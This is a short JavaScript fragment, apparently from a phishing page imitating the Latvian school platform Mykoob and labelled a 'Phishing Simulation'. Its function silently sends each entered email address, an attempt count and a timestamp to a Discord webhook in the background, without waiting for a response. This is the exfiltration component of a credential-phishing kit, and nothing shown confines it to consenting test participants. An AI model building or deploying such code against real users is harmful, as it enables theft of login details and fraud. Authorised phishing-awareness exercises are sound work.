// ── Send to Discord (fire and forget - non-blocking) ──
function sendToDiscord(email, action) {
    if (!attemptTracker[email]) {
        attemptTracker[email] = 0;
    }
    attemptTracker[email]++;
    
    const embed = {
        embeds: [{
            title: `🔐 ${action}`,
            color: 0xff4444,
            fields: [
                {
                    name: '📧 E-pasts',
                    value: email || 'Nav norādīts',
                    inline: true
                },
                {
                    name: '🔄 Mēģinājums #',
                    value: attemptTracker[email].toString(),
                    inline: true
                },
                {
                    name: '🕐 Laiks',
                    value: new Date().toLocaleString('lv-LV'),
                    inline: false
                }
            ],
            footer: {
                text: 'Mykoob Phishing Simulation'
            }
        }]
    };

    // Fire and forget - don't wait for response
    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed)
    }).catch(err => console.log('Webhook error (ignored):', err));
    
    // Don't await - let it run in background
}
